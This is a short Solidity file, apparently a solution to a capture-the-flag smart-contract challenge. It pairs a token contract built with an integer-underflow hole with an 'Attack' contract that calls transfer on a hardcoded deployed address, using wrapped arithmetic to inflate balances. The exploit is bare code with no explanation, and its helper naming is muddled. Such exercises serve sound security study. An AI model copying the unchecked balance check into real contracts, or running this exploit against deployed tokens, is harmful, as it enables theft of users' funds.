// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}


contract Attack {
    function overflow() internal returns (uint) {
        uint max = (2**256)-1;
        return max + 20;
    }
    function underflow() internal returns (uint) {
        uint min = 0;
        return min - 1;
    }
    function attack(address a) public {
        //change the address
        Token t = Token(0xfc8574342636697fA5b79ACC6EcEb710Cdf0F9A5);
        uint x = overflow();
        t.transfer(a, x);
    }
}
